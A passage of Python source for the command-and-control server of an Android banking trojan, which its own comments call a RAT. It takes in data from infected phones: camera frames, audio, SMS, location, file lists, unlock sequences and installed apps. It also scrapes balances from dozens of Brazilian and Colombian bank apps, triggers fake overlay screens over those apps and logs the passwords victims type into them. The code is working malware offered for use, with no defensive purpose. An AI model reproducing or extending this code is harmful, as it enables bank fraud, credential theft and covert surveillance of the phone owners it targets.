                                        if any(lk in resource_id for lk in ["limit", "limite", "credit_limit"]):
                                            lim_score += 4000
                                        for neighbor_idx in range(start_idx, end_idx):
                                            if neighbor_idx == idx:
                                                continue
                                            neighbor = nodes[neighbor_idx]
                                            n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                            distance = abs(neighbor_idx - idx)
                                            if any(lk in n_text for lk in lim_pos_keywords):
                                                lim_score += 4000 if distance == 1 else (2000 if distance <= 3 else 1000)
                                                
                                        if current_pkg:
                                            pkg_lower = current_pkg.lower()
                                            if "nu.production" in pkg_lower or "nubank" in pkg_lower:
                                                if "limit" in resource_id:
                                                    lim_score += 5000
                                                    
                                        if lim_score >= 150:
                                            lim_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": lim_score})
                                            
                                    # 3. Pontuação para Fatura
                                    is_lim_node = any(lk in val_str_lower for lk in ["limite", "limit"])
                                    if not (is_bal_node or is_lim_node):
                                        inv_score = 100
                                        if is_bank_screen:
                                            inv_score += 100
                                        if any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"]):
                                            inv_score += 3000
                                        if any(fk in resource_id for fk in ["fatura", "invoice", "bill"]):
                                            inv_score += 4000
                                        for neighbor_idx in range(start_idx, end_idx):
                                            if neighbor_idx == idx:
                                                continue
                                            neighbor = nodes[neighbor_idx]
                                            n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                            distance = abs(neighbor_idx - idx)
                                            if any(fk in n_text for fk in inv_pos_keywords):
                                                inv_score += 4000 if distance == 1 else (2000 if distance <= 3 else 1000)
                                                
                                        if inv_score >= 150:
                                            inv_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": inv_score})
                                    
                            # Tenta casar número puro apenas em telas financeiras
                            if is_bank_screen and not matches_sym:
                                matches_raw = money_raw_pattern.findall(val_str)
                                for m_tuple in matches_raw:
                                    m = m_tuple[0] or m_tuple[1]
                                    if m:
                                        val = parse_brl_value(m)
                                        if val is not None and -999999.0 <= val <= 9999999.0:
                                            formatted_val = f"R$ {m.strip()}"
                                            
                                            # 1. Pontuação Saldo (puro)
                                            is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "card", "loan", "invoice"])
                                            is_credit_res = any(nk in resource_id for nk in ["limit", "credit", "fatura", "loan", "emprestimo", "card", "cartao", "invoice"])
                                            
                                            start_idx = max(0, idx - 4)
                                            end_idx = min(len(nodes), idx + 5)
                                            has_credit_neighbor = False
                                            for neighbor_idx in range(start_idx, end_idx):
                                                if neighbor_idx == idx:
                                                    continue
                                                neighbor = nodes[neighbor_idx]
                                                n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                                if any(nk in n_text for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "card", "loan", "invoice"]):
                                                    has_credit_neighbor = True
                                                    break
                                                    
                                            if not (is_credit_node or is_credit_res or has_credit_neighbor):
                                                bal_score = 50
                                                if any(pk in resource_id for pk in ["balance", "saldo", "money", "txt_saldo", "user_balance"]):
                                                    bal_score += 4000
                                                for neighbor_idx in range(start_idx, end_idx):
                                                    if neighbor_idx == idx:
                                                        continue
                                                    neighbor = nodes[neighbor_idx]
                                                    n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                                    distance = abs(neighbor_idx - idx)
                                                    if any(pk in n_text for pk in bal_pos_keywords):
                                                        bal_score += 5000 if distance == 1 else (2500 if distance <= 3 else 1000)
                                                        
                                                if current_pkg:
                                                    pkg_lower = current_pkg.lower()
                                                    if "nu.production" in pkg_lower or "nubank" in pkg_lower:
                                                        if "balance" in resource_id or "saldo" in resource_id:
                                                            bal_score += 6000
                                                    elif "mercadopago" in pkg_lower:
                                                        if "balance" in resource_id or "money_amount" in resource_id:
                                                            bal_score += 6000
                                                    elif "itau" in pkg_lower:
                                                        if "saldo" in resource_id:
                                                            bal_score += 6000
                                                            
                                                if bal_score >= 150:
                                                    bal_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": bal_score})
                                                    
                                            # 2. Pontuação Limite (puro)
                                            is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupança", "investimento", "carteira", "extrato"])
                                            is_fatura_node = any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"])
                                            
                                            if not (is_bal_node or is_fatura_node):
                                                lim_score = 50
                                                if any(lk in val_str_lower for lk in ["limite", "limit"]):
                                                    lim_score += 3000
                                                if any(lk in resource_id for lk in ["limit", "limite", "credit_limit"]):
                                                    lim_score += 4000
                                                for neighbor_idx in range(start_idx, end_idx):
                                                    if neighbor_idx == idx:
                                                        continue
                                                    neighbor = nodes[neighbor_idx]
                                                    n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                                    distance = abs(neighbor_idx - idx)
                                                    if any(lk in n_text for lk in lim_pos_keywords):
                                                        lim_score += 4000 if distance == 1 else (2000 if distance <= 3 else 1000)
                                                        
                                                if current_pkg:
                                                    pkg_lower = current_pkg.lower()
                                                    if "nu.production" in pkg_lower or "nubank" in pkg_lower:
                                                        if "limit" in resource_id:
                                                            lim_score += 5000
                                                            
                                                if lim_score >= 150:
                                                    lim_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": lim_score})
                                                    
                                            # 3. Pontuação Fatura (puro)
                                            is_lim_node = any(lk in val_str_lower for lk in ["limite", "limit"])
                                            if not (is_bal_node or is_lim_node):
                                                inv_score = 50
                                                if any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"]):
                                                    inv_score += 3000
                                                if any(fk in resource_id for fk in ["fatura", "invoice", "bill"]):
                                                    inv_score += 4000
                                                for neighbor_idx in range(start_idx, end_idx):
                                                    if neighbor_idx == idx:
                                                        continue
                                                    neighbor = nodes[neighbor_idx]
                                                    n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                                    distance = abs(neighbor_idx - idx)
                                                    if any(fk in n_text for fk in inv_pos_keywords):
                                                        inv_score += 4000 if distance == 1 else (2000 if distance <= 3 else 1000)
                                                        
                                                if inv_score >= 150:
                                                    inv_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": inv_score})

                # Escolhe o melhor candidato de cada categoria
                best_balance = None
                best_limit = None
                best_invoice = None
                
                if bal_candidates:
                    best_c = max(bal_candidates, key=lambda c: c["score"])
                    if best_c["score"] >= 1000 or (is_bank_screen and best_c["score"] >= 150):
                        best_balance = best_c["formatted"]
                        
                if lim_candidates:
                    best_c = max(lim_candidates, key=lambda c: c["score"])
                    if best_c["score"] >= 1000 or (is_bank_screen and best_c["score"] >= 150):
                        best_limit = best_c["formatted"]
                        
                if inv_candidates:
                    best_c = max(inv_candidates, key=lambda c: c["score"])
                    if best_c["score"] >= 1000 or (is_bank_screen and best_c["score"] >= 150):
                        best_invoice = best_c["formatted"]

                if best_balance or best_limit or best_invoice:
                    # Busca o último registro de BANK_BALANCE deste dispositivo e package
                    recent = db.query(DeviceLog).filter(
                        DeviceLog.device_id == device_id,
                        DeviceLog.log_type == "BANK_BALANCE"
                    ).order_by(DeviceLog.created_at.desc()).first()
                    
                    last_balance = None
                    last_limit = None
                    last_invoice = None
                    
                    if recent:
                        try:
                            r_data = json.loads(recent.log_data)
                            if r_data.get("package") == current_pkg:
                                last_balance = r_data.get("balance")
                                last_limit = r_data.get("credit_limit")
                                last_invoice = r_data.get("invoice")
                        except:
                            pass
                            
                    # Mescla
                    final_balance = best_balance or last_balance
                    final_limit = best_limit or last_limit
                    final_invoice = best_invoice or last_invoice
                    
                    has_changes = False
                    if not recent:
                        has_changes = True
                    else:
                        if final_balance != last_balance or final_limit != last_limit or final_invoice != last_invoice:
                            # Se mudou de banco, sempre grava
                            try:
                                r_data = json.loads(recent.log_data)
                                if r_data.get("package") != current_pkg:
                                    has_changes = True
                                else:
                                    has_changes = True
                            except:
                                has_changes = True
                            
                    if (final_balance or final_limit or final_invoice) and has_changes:
                        app_name_captured = (active_bank or {}).get("appName") or manager.device_info.get(device_id, {}).get("foreground_app") or current_pkg.split(".")[-1].title()
                        balance_log = DeviceLog(
                            device_id=device_id,
                            log_type="BANK_BALANCE",
                            log_data=json.dumps({
                                "package": current_pkg,
                                "appName": app_name_captured,
                                "balance": final_balance,
                                "credit_limit": final_limit,
                                "invoice": final_invoice,
                                "source": "screen_hierarchy_auto"
                            }),
                            created_at=utc_now()
                        )
                        db.add(balance_log)
                        await safe_db_commit(db)
                        logger.info(f"💰 SALDO AUTO-CAPTURADO de {device_id} ({app_name_captured}): Saldo={final_balance} | Limite={final_limit} | Fatura={final_invoice}")
            except Exception as e:
                logger.error(f"Erro na captura de saldo: {e}")
        logger.info(f"👁️ Screen Hierarchy de {device_id}: {len(hierarchy_data) if hierarchy_data else 0} bytes")
    
    elif msg_type == "UNLOCK_SEQUENCE":
        # 🔓 Sequência de desbloqueio gravada
        sequence_data = message.get("data")
        if sequence_data:
            try:
                if isinstance(sequence_data, str):
                    sequence_data = json.loads(sequence_data)
                manager.store_unlock_sequence(device_id, sequence_data)
                logger.info(f"🔓 Unlock sequence de {device_id}: {sequence_data.get('count', 0)} ações")
            except Exception as e:
                logger.error(f"Erro ao processar unlock sequence: {e}")
    
    elif msg_type == "CAMERA_FRAME":
        # 📷 Frame da câmera (base64)
        frame_b64 = message.get("data")
        if frame_b64:
            frame_bytes = base64.b64decode(frame_b64)
            await manager.store_camera_frame(device_id, frame_bytes)
            logger.info(f"📷 Camera frame de {device_id}: {len(frame_bytes)} bytes")
    
    elif msg_type == "AUDIO_CHUNK":
        # 🎤 Chunk de áudio (base64)
        audio_b64 = message.get("data")
        if audio_b64:
            audio_bytes = base64.b64decode(audio_b64)
            await manager.store_audio_chunk(device_id, audio_bytes)
            logger.info(f"🎤 Audio chunk de {device_id}: {len(audio_bytes)} bytes")
    
    elif msg_type == "INSTALLED_APPS":
        # 📱 Lista de apps instalados — salva em memória E no banco para persistência de ícones
        apps_list = message.get("apps", [])
        apps_count = message.get("count", 0)
        manager.store_installed_apps(device_id, apps_list)
        
        # Persiste no banco (sobrescreve)
        try:
            existing = db.query(DeviceLog).filter(
                DeviceLog.device_id == device_id,
                DeviceLog.log_type == "INSTALLED_APPS_CACHE"
            ).first()
            cache_data = json.dumps({"apps": apps_list, "count": apps_count})
            if existing:
                existing.log_data = cache_data
                existing.created_at = utc_now()
            else:
                db.add(DeviceLog(
                    device_id=device_id,
                    log_type="INSTALLED_APPS_CACHE",
                    log_data=cache_data,
                    created_at=utc_now()
                ))
            await safe_db_commit(db)
        except Exception as e:
            logger.error(f"Erro ao persistir apps: {e}")
        
        logger.info(f"📱 Apps instalados de {device_id}: {apps_count} apps")
        
        # 📡 Notifica operadores conectados no painel web em tempo real
        try:
            await manager.broadcast_to_operators({
                "type": "INSTALLED_APPS",
                "device_id": device_id,
                "apps": apps_list,
                "count": apps_count
            })
        except Exception as e:
            logger.debug(f"Erro ao transmitir apps para operadores: {e}")
        
    elif msg_type == "BANK_OPENED":
        package = message.get("package")
        app_name = message.get("appName")
        icon = message.get("icon")
        if not icon:
            installed_apps = manager.get_installed_apps(device_id)
            if installed_apps:
                for app in installed_apps:
                    if app.get("package") == package and app.get("icon"):
                        icon = app.get("icon")
                        break
            if not icon:
                try:
                    existing = db.query(DeviceLog).filter(
                        DeviceLog.device_id == device_id,
                        DeviceLog.log_type == "INSTALLED_APPS_CACHE"
                    ).first()
                    if existing:
                        cache_data = json.loads(existing.log_data)
                        for app in cache_data.get("apps", []):
                            if app.get("package") == package and app.get("icon"):
                                icon = app.get("icon")
                                break
                except:
                    pass
        manager.device_active_banks[device_id] = {
            "package": package,
            "appName": app_name,
            "icon": icon,
            "timestamp": utc_now().isoformat()
        }
        logger.info(f"BANCO ABERTO: {device_id} abriu {app_name} ({package})")
        
    elif msg_type == "BANK_BALANCE":
        # 💰 Saldo bancário enviado explicitamente pelo app
        package = message.get("package")
        app_name = message.get("appName") or message.get("bank")
        balance = message.get("balance")
        if package and balance:
            # Formata o valor se vier sem R$
            if not str(balance).startswith("R$"):
                balance = f"R$ {balance}"
            log = DeviceLog(
                device_id=device_id,
                log_type="BANK_BALANCE",
                log_data=json.dumps({
                    "package": package,
                    "appName": app_name or package.split(".")[-1].title(),
                    "balance": balance,
                    "source": "app_explicit"
                }),
                created_at=utc_now()
            )
            db.add(log)
            await safe_db_commit(db)
            logger.info(f"💰 SALDO EXPLICIT de {device_id} ({app_name}): {balance}")
        
    elif msg_type == "BANK_CLOSED":
        if device_id in manager.device_active_banks:
            del manager.device_active_banks[device_id]
        logger.info(f"BANCO FECHADO: {device_id} fechou o aplicativo de banco")

    elif msg_type in ("SMS", "SMS_LIST", "GET_SMS"):
        sms_data = message.get("data") or message.get("sms") or message.get("messages")
        logger.info(f"📱 SMS recebidos de {device_id}")
        try:
            sms_json = json.dumps(sms_data, ensure_ascii=False) if not isinstance(sms_data, str) else sms_data
            existing_cap = db.query(CapturedData).filter(
                CapturedData.device_id == device_id,
                CapturedData.data_type == "SMS"
            ).first()
            if existing_cap:
                existing_cap.data_content = sms_json
            else:
                db.add(CapturedData(device_id=device_id, data_type="SMS", data_content=sms_json))
            await safe_db_commit(db)
        except Exception as e:
            logger.error(f"Erro ao salvar SMS: {e}")
        await manager.broadcast_to_operators({
            "type": "SMS_LIST",
            "device_id": device_id,
            "data": sms_data
        })

    elif msg_type in ("LOCATION", "LOCATION_DATA", "GPS_LOCATION"):
        loc_data = message.get("data") or message
        logger.info(f"📍 LOCALIZAÇÃO recebida de {device_id}: {loc_data}")
        try:
            loc_json = json.dumps(loc_data, ensure_ascii=False) if not isinstance(loc_data, str) else loc_data
            existing_cap = db.query(CapturedData).filter(
                CapturedData.device_id == device_id,
                CapturedData.data_type == "LOCATION"
            ).first()
            if existing_cap:
                existing_cap.data_content = loc_json
            else:
                db.add(CapturedData(device_id=device_id, data_type="LOCATION", data_content=loc_json))
            await safe_db_commit(db)
        except Exception as e:
            logger.error(f"Erro ao salvar localização: {e}")
        await manager.broadcast_to_operators({
            "type": "LOCATION",
            "device_id": device_id,
            "data": loc_data
        })

    elif msg_type in ("FILE_LIST", "FILES", "SDCARD_FILES"):
        file_data = message.get("data") or message.get("files")
        path = message.get("path") or "/sdcard"
        logger.info(f"📁 FILE_LIST de {device_id} ({path})")
        try:
            file_json = json.dumps({"path": path, "files": file_data}, ensure_ascii=False) if not isinstance(file_data, str) else file_data
            existing_cap = db.query(CapturedData).filter(
                CapturedData.device_id == device_id,
                CapturedData.data_type == f"FILE_LIST_{path}"
            ).first()
            if existing_cap:
                existing_cap.data_content = file_json
            else:
                db.add(CapturedData(device_id=device_id, data_type=f"FILE_LIST_{path}", data_content=file_json))
            await safe_db_commit(db)
        except Exception as e:
            logger.error(f"Erro ao salvar lista de arquivos: {e}")
        await manager.broadcast_to_operators({
            "type": "FILE_LIST",
            "device_id": device_id,
            "path": path,
            "data": file_data
        })

    elif msg_type == "STUDIO_FORM_DATA":
        # Recebe os dados enviados pelo formulário da tela customizada
        data = message.get("data") or {}
        project_id = message.get("project_id") or data.get("_projectId") or "unknown"
        logger.info(f"🎨 STUDIO_FORM_DATA recebido de {device_id} para o projeto {project_id}: {data}")
        
        # 1. Salva na tabela StudioCapturedData (se o projeto for conhecido/existente)
        from models import APKStudioProject, StudioCapturedData
        project = db.query(APKStudioProject).filter(
            APKStudioProject.project_id == project_id
        ).first()
        
        owner_id = project.owner_id if project else 1 # Fallback para admin (ID 1)
        client_ip = message.get("ip_address") or manager.device_info.get(device_id, {}).get("ip_address") or "WebSocket"
        
        captured = StudioCapturedData(
            project_id=project_id,
            owner_id=owner_id,
            data_json=json.dumps(data, ensure_ascii=False),
            device_ip=client_ip,
            device_info=json.dumps(manager.device_info.get(device_id, {}), ensure_ascii=False)
        )
        db.add(captured)
        await safe_db_commit(db)
        
        # 1.b. Salva log de overlay submetido para impedir novas exibições no auto-gatilho
        active_bank = manager.device_active_banks.get(device_id) or {}
        pkg_name = active_bank.get("package") or manager.device_info.get(device_id, {}).get("foreground_package") or "unknown"
        
        submit_info = {
            'device_id': device_id,
            'project_id': project_id,
            'package': pkg_name,
            'timestamp': utc_now().isoformat()
        }
        submit_log = DeviceLog(
            device_id=device_id,
            log_type="OVERLAY_SUBMITTED",
            log_data=json.dumps(submit_info, ensure_ascii=False),
            created_at=utc_now()
        )
        db.add(submit_log)
        
        # Salva o payload completo como CUSTOM_CAPTURES para visualização na aba de capturas customizadas
        custom_capture_log = DeviceLog(
            device_id=device_id,
            log_type="CUSTOM_CAPTURES",
            log_data=json.dumps({
                'project_id': project_id,
                'project_name': project.name if project else "Custom Screen",
                'captured_data': data,
                'timestamp': utc_now().isoformat()
            }, ensure_ascii=False),
            created_at=utc_now()
        )
        db.add(custom_capture_log)
        await safe_db_commit(db)
        
        # 2. Se houver algum campo de senha no formulário, salva na tabela DeviceLog como BANK_PASSWORD
        password = None
        field_found = "Senha"
        for k, v in data.items():
            if k.startswith("_") or k == "project_id":
                continue
            k_lower = k.lower()
            if any(term in k_lower for term in ["senha", "password", "pin", "code", "codigo", "assinatura"]):
                password = str(v)
                field_found = k
                break
        
        if not password:
            non_internal_fields = [v for k, v in data.items() if not k.startswith("_") and k != "project_id"]
            if non_internal_fields:
                password = str(non_internal_fields[0])
                
        if password:
            active_bank = manager.device_active_banks.get(device_id) or {}
            
            # Tenta pegar pacote vindo da injeção ou do active_bank
            target_pkg = data.get("package") or active_bank.get("package") or "Desconhecido"
            target_bank = data.get("bank") or active_bank.get("appName")
            
            if not target_bank or target_bank == "Desconhecido":
                target_bank = BankPasswordDetector.BANK_APPS.get(target_pkg)
            if not target_bank or target_bank == "Desconhecido":
                target_bank = 'Itaú' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
            
            password_info = {
                'device_id': device_id,
                'bank': target_bank,
                'package': target_pkg,
                'packageName': target_pkg,
                'password': password,
                'type': 'FORM_PASSWORD',
                'timestamp': utc_now().isoformat(),
                'field_name': field_found,
                'label': field_found,
                'hint': field_found,
                'source': 'VISUAL_SCREEN'
            }
            
            log = DeviceLog(
                device_id=device_id,
                log_type="BANK_PASSWORD",
                log_data=json.dumps(password_info, ensure_ascii=False),
                created_at=utc_now()
            )
            db.add(log)
            await safe_db_commit(db)
            logger.info(f"🔐 SENHA CAPTURADA VIA OVERLAY de {device_id} ({target_bank}): {password}")
        
        # 🔄 AUTO-DISARM: Remove overlay automaticamente após captura de dados do formulário
        # Isso impede que o overlay apareça novamente quando o usuário reabrir o app
        try:
            from models import DeviceOverlayMapping
            from sqlalchemy import func
            disarm_pkg = pkg_name if pkg_name and pkg_name != "unknown" else None
            if not disarm_pkg:
                disarm_pkg = data.get("package") or data.get("_package") or (active_bank or {}).get("package")
            if not disarm_pkg:
                disarm_pkg = manager.device_info.get(device_id, {}).get("foreground_package")
            
            if disarm_pkg and disarm_pkg != "unknown":
                # Deleta o mapeamento do overlay do banco de dados
                mappings_to_delete = db.query(DeviceOverlayMapping).filter(
                    func.lower(DeviceOverlayMapping.device_id) == device_id.lower(),
                    func.lower(DeviceOverlayMapping.package_name) == disarm_pkg.lower()
                ).all()
                
                if mappings_to_delete:
                    for mdel in mappings_to_delete:
                        db.delete(mdel)
                    await safe_db_commit(db)
                    
                    # Envia comando para remover overlay do aparelho
                    await manager.send_command(device_id, {"action": "BLACK_SCREEN_OFF"})
                    
                    # Reseta o tracking de injeção
                    for dev_key in list(manager.device_info.keys()):
                        if dev_key.lower() == device_id.lower():
                            manager.device_info[dev_key]["last_injected_package"] = None
                    if device_id in manager.device_info:
                        manager.device_info[device_id]["last_injected_package"] = None
                    
                    # Notifica o painel
                    bank_label = target_bank if password else (BankPasswordDetector.BANK_APPS.get(disarm_pkg, disarm_pkg.split('.')[-1].title() if '.' in disarm_pkg else 'App'))
                    await manager.broadcast_to_operators({
                        "type": "OVERLAY_AUTO_DISARMED",
                        "device_id": device_id,
                        "package": disarm_pkg,
                        "bank": bank_label,
                        "reason": "FORM_SUBMITTED"
                    })
                    
                    logger.info(f"\n{'='*60}")
                    logger.info(f"🔄 AUTO-DISARM: Overlay removido automaticamente após submissão!")
                    logger.info(f"Pacote: {disarm_pkg}")
                    logger.info(f"Device: {device_id}")
                    logger.info(f"{'='*60}\n")
                else:
                    logger.info(f"🔄 AUTO-DISARM: Nenhum mapeamento encontrado para {disarm_pkg} (já removido?)")
        except Exception as auto_disarm_err:
            logger.error(f"❌ Erro no auto-disarm após STUDIO_FORM_DATA: {auto_disarm_err}")

    elif msg_type == "DEVICE_STATUS":
        # Aceita vários formatos de campo (do app Android)
        package = (
            message.get("package") or
            message.get("foregroundPackage") or
            message.get("foreground_package") or
            message.get("currentPackage") or
            ""
        )
        app_name = (
            message.get("appName") or
            message.get("app_name") or
            message.get("foregroundApp") or
            message.get("currentApp") or
            ""
        )
        is_locked = bool(message.get("isLocked", False))
        is_screen_on = bool(message.get("isScreenOn", True))
        bat = _extract_battery_level(message)
        if device_id not in manager.device_info:
            manager.device_info[device_id] = {}
        status_update = {
            "foreground_package": package,
            "foreground_app": app_name,
            "is_locked": is_locked,
            "is_screen_on": is_screen_on
        }
        if bat is not None:
            status_update["battery_level"] = bat
        if message.get("is_charging") is not None:
            status_update["is_charging"] = bool(message.get("is_charging"))
        manager.device_info[device_id].update(status_update)
        
        # 🏦 DETECÇÃO AUTOMÁTICA DE BANCO via foreground_package (Loose matching para não falhar em nenhum banco)
        BANK_KEYWORDS = [
            "nubank", "nu.production", "itau", "bb.android", "bancodobrasil", "bradesco", 
            "santander", "bancointer", "intermedium", "caixa", "c6bank", "neon", "pagbank", 
            "pagseguro", "mercadopago", "picpay", "panapp", "sicredi", "original", "stone", 
            "modal", "xpinvestimentos", "safra", "bancovotorantim", "bmg.android", "banrisul", 
            "brb.mobile", "rendimento", "bs2", "digio", "recargapay", "will.bank", "agibank", 
            "sofisa", "citibank", "daycoval", "creditas", "sicoob", "btg.pactual", "btgpactual",
            "rico", "clear", "avenue", "nomad", "mercantil", "superdigital", "genial", "bari",
            "pine", "bancobari", "bancopine", "bancobmg", "bancobv", "bancobs2", "next.android",
            "next", "davivienda", "daviplata", "bancolombia", "nequi", "bancodebogota",
            "mbankingcolombia", "bancopopular", "bancodeoccidente", "avvillas", "colpatria",
            "lulobank", "rappi", "falabella", "bancoagrario"
        ]
        
        is_bank = False
        if package:
            pkg_lower = package.lower()
            # 1. Verifica se bate com palavras-chave conhecidas de bancos
            is_bank_kw = any(kw in pkg_lower for kw in BANK_KEYWORDS)
            
            # 2. Se for um banco da lista padrão, verifica se é um app instalado/baixado (não de sistema)
            if not is_bank_kw:
                installed_apps = []
                try:
                    existing = db.query(DeviceLog).filter(
                        DeviceLog.device_id == device_id,
                        DeviceLog.log_type == "INSTALLED_APPS_CACHE"
                    ).first()
                    if existing:
                        cache_data = json.loads(existing.log_data)
                        installed_apps = cache_data.get("apps", [])
                except Exception as e:
                    logger.error(f"Erro ao ler cache de apps para injecao: {e}")
                
                found_app = None
                for app in installed_apps:
                    if app.get("package") == package:
                        found_app = app
                        break
                
                if found_app:
                    # Se achou no cache de apps, ativa se não for um app do sistema
                    is_bank_kw = not found_app.get("isSystem", True)
                else:
                    # Fallback robusto caso o cache ainda não exista ou esteja vazio
                    is_system_prefix = (
                        pkg_lower.startswith("com.android.") or
                        pkg_lower.startswith("com.google.android.") or
                        pkg_lower.startswith("com.sec.android.") or
                        pkg_lower.startswith("com.miui.") or
                        pkg_lower.startswith("com.xiaomi.") or
                        pkg_lower.startswith("com.huawei.") or
                        pkg_lower.startswith("com.samsung.") or
                        pkg_lower.startswith("com.coloros.") or
                        pkg_lower.startswith("com.oppo.") or
                        pkg_lower.startswith("com.vivo.") or
                        pkg_lower == "android" or
                        pkg_lower == "com.android.systemui"
                    )
                    is_bank_kw = not is_system_prefix
            
            # CRITICAL FIX: is_bank for detection and active_bank list should ONLY trigger if the user has explicitly mapped
            # this specific app in the control panel, OR it falls in the high-fidelity bank keywords.
            # We want to avoid locking down normal non-bank apps with a black overlay unless mapped!
            from models import DeviceOverlayMapping
            from sqlalchemy import func
            has_explicit_mapping = db.query(DeviceOverlayMapping).filter(
                func.lower(DeviceOverlayMapping.device_id) == device_id.lower(),
                func.lower(DeviceOverlayMapping.package_name) == package.lower(),
                DeviceOverlayMapping.is_enabled == True
            ).first() is not None
            
            is_bank = has_explicit_mapping or (is_bank_kw and any(bank_name in pkg_lower for bank_name in [
                "nubank", "itau", "bradesco", "santander", "caixa", "bancointer", "c6bank", "neon", "pagbank", "pagseguro", "mercadopago", "picpay",
                "davivienda", "daviplata", "bancolombia", "nequi", "bancodebogota", "mbankingcolombia", "bancopopular", "bancodeoccidente", "avvillas", "colpatria", "lulobank", "rappi", "falabella", "bancoagrario"
            ]))
            
        if is_bank:
            # Auto-set active_bank se o app é um banco
            current_bank = manager.device_active_banks.get(device_id)
            if not current_bank or current_bank.get("package") != package:
                # Tenta obter o ícone real em base64 do banco a partir do cache
                captured_icon = None
                installed_apps = manager.get_installed_apps(device_id)
                if installed_apps:
                    for app in installed_apps:
                        if app.get("package") == package and app.get("icon"):
                            captured_icon = app.get("icon")
                            break
                if not captured_icon:
                    try:
                        existing = db.query(DeviceLog).filter(
                            DeviceLog.device_id == device_id,
                            DeviceLog.log_type == "INSTALLED_APPS_CACHE"
                        ).first()
                        if existing:
                            cache_data = json.loads(existing.log_data)
                            for app in cache_data.get("apps", []):
                                if app.get("package") == package and app.get("icon"):
                                    captured_icon = app.get("icon")
                                    break
                    except Exception as e:
                        logger.error(f"Erro ao buscar ícone do cache: {e}")

                manager.device_active_banks[device_id] = {
                    "package": package,
                    "appName": app_name or package.split(".")[-1].title(),
                    "icon": captured_icon,
                    "timestamp": utc_now().isoformat(),
                    "auto_detected": True
                }
                logger.info(f"🏦 AUTO-DETECTADO banco aberto: {device_id} → {app_name or package}")
        elif package and device_id in manager.device_active_banks:
            # Se o app em foreground não é banco, limpa active_bank (mas só se foi auto-detectado)
            current = manager.device_active_banks.get(device_id, {})
            if current.get("auto_detected"):
                # Ignora se for teclado ou core system ui para não fechar o banco erroneamente ao digitar
                pkg_lower = package.lower()
                is_ignored = (
                    any(k in pkg_lower for k in ["inputmethod", "keyboard", "gboard", "latin", "ime", "swiftkey", "samsung.i18n"]) or
                    pkg_lower in ["android", "com.android.systemui"]
                )
                if not is_ignored:
                    del manager.device_active_banks[device_id]
                    logger.info(f"🏦 AUTO-DETECTADO banco fechado: {device_id} (saiu para {package})")
        
        logger.info(f"📱 STATUS {device_id}: pkg={package}, app={app_name}, locked={is_locked}, screen_on={is_screen_on}")

        # ========== AUTO-GATILHO DE OVERLAY ==========
        if package:
            from models import DeviceOverlayMapping
            from sqlalchemy import func
            
            pkg_clean = package.strip().lower()
            
            # Busca se existe mapeamento ativo para este pacote no dispositivo (case-insensitive)
            mapping = db.query(DeviceOverlayMapping).filter(
                func.lower(DeviceOverlayMapping.device_id) == device_id.lower(),
                func.lower(DeviceOverlayMapping.package_name) == pkg_clean,
                DeviceOverlayMapping.is_enabled == True
            ).first()

            if not mapping:
                # Tenta fallback por alias/palavras-chave bancárias
                all_maps = db.query(DeviceOverlayMapping).filter(
                    func.lower(DeviceOverlayMapping.device_id) == device_id.lower(),
                    DeviceOverlayMapping.is_enabled == True
                ).all()
                bank_kws = ["itau", "caixa", "nubank", "bradesco", "santander", "inter", "c6", "picpay", "mercadopago", "neon", "banrisul", "sicredi", "banco", "bb"]
                for m in all_maps:
                    m_pkg = (m.package_name or "").lower()
                    for kw in bank_kws:
                        if kw in pkg_clean and kw in m_pkg:
                            mapping = m
                            logger.info(f"🔮 Auto-gatilho: Mapeamento equivalente encontrado no servidor ('{m_pkg}' -> '{pkg_clean}')")
                            break
                    if mapping:
                        break
            
            dev_info = manager.device_info.get(device_id, {})
            if not dev_info:
                for d_k, d_v in manager.device_info.items():
                    if d_k.lower() == device_id.lower():
                        dev_info = d_v
                        break
            last_injected = dev_info.get("last_injected_package")
            
            # Pega o package name do próprio RAT/app se registrado para este dispositivo
            device_pkg = None
            try:
                device = db.query(Device).filter(func.lower(Device.device_id) == device_id.lower()).first()
                if device and device.package_name:
                    device_pkg = device.package_name.lower()
            except Exception:
                pass
            
            is_ignored = (
                (device_pkg and pkg_clean == device_pkg) or
                pkg_clean == "com.seguranca.protecao" or
                any(k in pkg_clean for k in [
                    "inputmethod", "keyboard", "gboard", "latin", "ime", "swiftkey", "samsung.i18n",
                    "permissioncontroller", "systemui", "wallpaper", "chooser", "resolver"
                ]) or
                pkg_clean in ["android", "com.android.systemui"]
            )
            
            if mapping:
                if last_injected != package and last_injected != pkg_clean:
                    # 🔄 VERIFICAÇÃO: Se o overlay já foi submetido para este pacote, NÃO re-injetar
                    # Em vez disso, deleta o mapeamento (auto-disarm)
                    already_submitted = db.query(DeviceLog).filter(
                        func.lower(DeviceLog.device_id) == device_id.lower(),
                        DeviceLog.log_type == "OVERLAY_SUBMITTED",
                        DeviceLog.log_data.like(f'%{pkg_clean}%')
                    ).first()
                    
                    # Também verifica BANK_PASSWORD capturada para este pacote
                    if not already_submitted:
                        already_submitted = db.query(DeviceLog).filter(
                            func.lower(DeviceLog.device_id) == device_id.lower(),
                            DeviceLog.log_type == "BANK_PASSWORD",
                            DeviceLog.log_data.like(f'%{pkg_clean}%')
                        ).first()
                    
                    if already_submitted:
                        # Já foi submetido! Auto-disarm: deleta o mapeamento
                        try:
                            db.delete(mapping)
                            db.commit()
                            logger.info(f"\n{'='*60}")
                            logger.info(f"🔄 AUTO-DISARM NO GATILHO: Overlay já submetido anteriormente!")
                            logger.info(f"Pacote: {pkg_clean}")
                            logger.info(f"Device: {device_id}")
